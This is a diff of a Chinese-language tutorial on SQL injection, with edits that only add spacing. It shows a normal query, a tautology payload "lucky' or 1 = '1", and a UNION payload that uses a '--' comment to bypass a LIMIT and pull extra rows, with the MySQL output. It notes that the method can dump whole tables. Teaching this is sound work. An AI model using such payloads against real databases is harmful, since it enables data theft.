@@ -1,6 +1,6 @@
 ## SQL 注入攻击
 
-### SQL未转义注入
+### SQL 未转义注入
 
 #### 正常请求
 - name = `lucky`
@@ -14,7 +14,7 @@ mysql> select * from t_new where name = 'lucky' limit 1;
 +-------+-------+----------+---------------------+--------+
 ```
 
-#### 验证是否可以进行SQL注入
+#### 验证是否可以进行 SQL 注入
 - name = `lucky' or 1 = '1`
 ```sql
 mysql> select * from t_new where name = 'lucky' or 1 = '1' limit 1;
@@ -25,10 +25,10 @@ mysql> select * from t_new where name = 'lucky' or 1 = '1' limit 1;
 +-------+-------+----------+---------------------+--------+
 ```
 
-#### 构造SQL，获取更多的数据
+#### 构造 SQL，获取更多的数据
 - name = `lucky' union select * from t_new where id = '90002' limit 2; --`
-- 如上攻击SQL稍做修改，就可以把整个表脱下来，俗称“`脱裤`”
-- `--` 会直接注释后面的 `' limit 1;`，这样一来可以解决`limit 1`的限制，在命令行多产生两条SQL，不影响数据的查询
+- 如上攻击 SQL 稍做修改，就可以把整个表脱下来，俗称“`脱裤`”
+- `--` 会直接注释后面的 `' limit 1;`，这样一来可以解决`limit 1`的限制，在命令行多产生两条 SQL，不影响数据的查询
 ```sql
 mysql> select * from t_new where name = 'lucky' union select * from t_new where id = '90002' limit 2; --' limit 1;
 +-------+-------+----------+---------------------+--------+
